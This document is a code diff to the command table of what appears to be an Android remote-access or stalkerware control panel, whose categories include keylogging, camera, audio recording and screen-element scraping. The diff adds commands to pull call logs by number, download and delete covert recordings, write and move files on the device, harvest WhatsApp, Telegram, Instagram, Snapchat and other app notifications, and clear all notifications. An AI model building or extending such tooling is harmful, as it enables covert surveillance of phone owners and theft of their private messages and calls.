@@ -55,9 +55,10 @@ const COMMANDS = {
     label: 'Calls',
     icon: '📞',
     cmds: [
-      { id: 'get_all_call_logs',     icon: '📞', label: 'All Calls',    params: [{ key: 'limit', label: 'Limit', default: '100' }] },
-      { id: 'get_call_statistics',   icon: '📊', label: 'Call Stats' },
-      { id: 'get_call_logs_by_type', icon: '📞', label: 'By Type',      params: [{ key: 'callType', label: 'Type (1=in, 2=out, 3=missed)', default: '1' }, { key: 'limit', label: 'Limit', default: '50' }] },
+      { id: 'get_all_call_logs',       icon: '📞', label: 'All Calls',     params: [{ key: 'limit', label: 'Limit', default: '100' }] },
+      { id: 'get_call_statistics',     icon: '📊', label: 'Call Stats' },
+      { id: 'get_call_logs_by_type',   icon: '📞', label: 'By Type',       params: [{ key: 'callType', label: 'Type (1=in, 2=out, 3=missed)', default: '1' }, { key: 'limit', label: 'Limit', default: '50' }] },
+      { id: 'get_call_logs_from_number', icon: '📞', label: 'From Number', params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'limit', label: 'Limit', default: '50' }] },
     ]
   },
   camera: {
@@ -73,21 +74,27 @@ const COMMANDS = {
     label: 'Audio',
     icon: '🎤',
     cmds: [
-      { id: 'start_recording',      icon: '🎤', label: 'Start Rec',  params: [{ key: 'filename', label: 'Filename (optional)', default: '' }] },
+      { id: 'start_recording',      icon: '🎤', label: 'Start Rec',     params: [{ key: 'filename', label: 'Filename (optional)', default: '' }] },
       { id: 'stop_recording',       icon: '⏹️', label: 'Stop Rec' },
       { id: 'get_recording_status', icon: '🎙️', label: 'Rec Status' },
       { id: 'list_recordings',      icon: '🎵', label: 'List Recs' },
+      { id: 'get_audio',            icon: '📥', label: 'Get Audio',      params: [{ key: 'filePath', label: 'File Path', default: '' }] },
+      { id: 'delete_recording',     icon: '🗑️', label: 'Delete Rec',    params: [{ key: 'filePath', label: 'File Path', default: '' }] },
     ]
   },
   files: {
     label: 'Files',
     icon: '📁',
     cmds: [
-      { id: 'list_files',       icon: '📁', label: 'List Files',  params: [{ key: 'path', label: 'Path (blank = root)', default: '' }] },
-      { id: 'read_file',        icon: '📄', label: 'Read File',   params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'asBase64', label: 'As Base64 (true/false)', default: 'false' }] },
-      { id: 'search_files',     icon: '🔍', label: 'Search Files',params: [{ key: 'directory', label: 'Directory', default: '/sdcard' }, { key: 'query', label: 'Query', default: '' }] },
-      { id: 'get_file_info',    icon: '📄', label: 'File Info',   params: [{ key: 'filePath', label: 'File Path', default: '' }] },
-      { id: 'delete_file',      icon: '🗑️', label: 'Delete File', params: [{ key: 'filePath', label: 'File Path', default: '' }] },
+      { id: 'list_files',         icon: '📁', label: 'List Files',     params: [{ key: 'path', label: 'Path (blank = root)', default: '' }] },
+      { id: 'read_file',          icon: '📄', label: 'Read File',      params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'asBase64', label: 'As Base64 (true/false)', default: 'false' }] },
+      { id: 'write_file',         icon: '✏️', label: 'Write File',     params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'content', label: 'Content', default: '' }, { key: 'isBase64', label: 'Is Base64 (true/false)', default: 'false' }] },
+      { id: 'copy_file',          icon: '📋', label: 'Copy File',      params: [{ key: 'sourcePath', label: 'Source Path', default: '' }, { key: 'destPath', label: 'Dest Path', default: '' }] },
+      { id: 'move_file',          icon: '✂️', label: 'Move File',      params: [{ key: 'sourcePath', label: 'Source Path', default: '' }, { key: 'destPath', label: 'Dest Path', default: '' }] },
+      { id: 'create_directory',   icon: '📂', label: 'Create Dir',     params: [{ key: 'path', label: 'Directory Path', default: '' }] },
+      { id: 'search_files',       icon: '🔍', label: 'Search Files',   params: [{ key: 'directory', label: 'Directory', default: '/sdcard' }, { key: 'query', label: 'Query', default: '' }] },
+      { id: 'get_file_info',      icon: '📄', label: 'File Info',      params: [{ key: 'filePath', label: 'File Path', default: '' }] },
+      { id: 'delete_file',        icon: '🗑️', label: 'Delete File',    params: [{ key: 'filePath', label: 'File Path', default: '' }] },
     ]
   },
   keylog: {
@@ -155,6 +162,22 @@ const COMMANDS = {
       { id: 'get_clickable_elements',  icon: '👆', label: 'Clickable Els' },
       { id: 'get_input_fields',        icon: '✏️', label: 'Input Fields' },
       { id: 'find_by_text',            icon: '🔍', label: 'Find By Text', params: [{ key: 'text', label: 'Text to find', default: '' }] },
+    ]
+  },
+  social_media: {
+    label: 'Social Media',
+    icon: '📱',
+    cmds: [
+      { id: 'get_notifications_from_app', icon: '💬', label: 'WhatsApp',   params: [{ key: 'packageName', label: 'Package', default: 'com.whatsapp' }] },
+      { id: 'get_notifications_from_app', icon: '📸', label: 'Instagram',  params: [{ key: 'packageName', label: 'Package', default: 'com.instagram.android' }] },
+      { id: 'get_notifications_from_app', icon: '🐦', label: 'Twitter/X',  params: [{ key: 'packageName', label: 'Package', default: 'com.twitter.android' }] },
+      { id: 'get_notifications_from_app', icon: '📘', label: 'Facebook',   params: [{ key: 'packageName', label: 'Package', default: 'com.facebook.katana' }] },
+      { id: 'get_notifications_from_app', icon: '📲', label: 'Telegram',   params: [{ key: 'packageName', label: 'Package', default: 'org.telegram.messenger' }] },
+      { id: 'get_notifications_from_app', icon: '💼', label: 'Snapchat',   params: [{ key: 'packageName', label: 'Package', default: 'com.snapchat.android' }] },
+      { id: 'get_notifications_from_app', icon: '🎵', label: 'TikTok',     params: [{ key: 'packageName', label: 'Package', default: 'com.zhiliaoapp.musically' }] },
+      { id: 'get_notifications_from_app', icon: '📱', label: 'Custom App', params: [{ key: 'packageName', label: 'Package Name', default: '' }] },
+      { id: 'get_notifications',          icon: '🔔', label: 'All Notifs' },
+      { id: 'clear_notifications',        icon: '🧹', label: 'Clear All' },
     ]
   }
 };
